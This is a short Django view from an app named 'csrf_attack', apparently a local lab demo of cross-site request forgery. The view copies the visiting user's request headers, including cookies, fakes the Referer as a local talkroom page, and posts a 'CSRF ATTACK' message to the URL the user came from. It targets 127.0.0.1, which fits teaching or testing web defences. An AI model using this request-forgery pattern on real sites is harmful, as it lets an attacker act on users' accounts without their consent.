from django.shortcuts import render

import requests


def teacher_list(request):
    template_name = "csrf_attack/teacher_list.html"

    url = request.headers["Referer"]
    referer = "http://127.0.0.1:8000/talkroom-list/"
    content_type = "application/x-www-form-urlencoded"
    headers = dict(request.headers)
    headers["Referer"] = referer
    headers["Content-Type"] = content_type
    params = {
        "content": "CSRF ATTACK",
    }

    requests.post(
        url=url,
        headers=headers,
        data=params,
    )
    return render(request, template_name)
